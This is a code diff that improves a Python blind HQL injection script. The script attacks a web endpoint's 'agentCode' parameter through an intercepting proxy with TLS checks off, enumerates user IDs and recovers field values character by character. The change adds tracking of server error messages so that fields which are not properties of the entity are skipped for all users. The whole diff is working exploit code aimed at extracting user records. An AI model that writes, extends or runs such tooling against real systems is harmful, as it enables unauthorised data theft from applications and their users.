@@ -10,6 +10,8 @@ VERIFY_TLS = False
 PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # set None to disable
 HEADERS = {}  # extra headers if needed
 REQUESTS_SENT = 0
+LAST_MSG = ""
+MISSING_FIELDS: set[str] = set()
 
 # Phase 1: userId discovery
 TARGET_ENTITY_COUNT = 2
@@ -188,11 +190,25 @@ def inj(expr: str) -> str:
 def exists(hql_bool: str) -> str:
     return f"exists ( from {HQL_ENTITY} u where {hql_bool} )"
 
+def is_unknown_property_error(field: str) -> bool:
+    """Return True if the last response message indicates an unknown/invalid property."""
+    msg = LAST_MSG or ""
+    if not msg:
+        return False
+    low = msg.lower()
+    if field.lower() not in low:
+        return False
+    return (
+        "unknownpathexception" in low
+        or "could not resolve property" in low
+        or "could not resolve attribute" in low
+    )
+
 def do_request(agent: str):
     params = {"agentCode": agent}
     r = requests.get(URL, params=params, headers=HEADERS,
                      timeout=20, verify=VERIFY_TLS, proxies=PROXY)
-    global REQUESTS_SENT
+    global REQUESTS_SENT, LAST_MSG
     REQUESTS_SENT += 1
     try:
         j = r.json()
@@ -202,6 +218,7 @@ def do_request(agent: str):
     mi = j.get("msgInfo") or {}
     sc = str(mi.get("statusCode") or "")
     msg = mi.get("message") or ""
+    LAST_MSG = msg
     if DEBUG:
         print(f"[req] agentCode={agent!r} -> statusCode={sc}, message={msg}")
     if SLEEP_BETWEEN:
@@ -281,8 +298,17 @@ def prefix_is(user_id: str, field: str, prefix: str):
     return truthy(inj(exists(where)))
 
 def recover_field(user_id: str, field: str, maxlen: int):
+    # If we've already learned this field doesn't exist on the entity, skip globally
+    if field in MISSING_FIELDS:
+        if DEBUG:
+            print(f"[i] skipping {field}: previously marked missing on {HQL_ENTITY}")
+        return None
     present = field_not_null(user_id, field)
     if present is not True:
+        if is_unknown_property_error(field):
+            MISSING_FIELDS.add(field)
+            print(f"[i] disabling {field}: not a property on {HQL_ENTITY}; skipping for all users")
+            return None
         print(f"[i] {field} is null/absent for {user_id}")
         return None
 
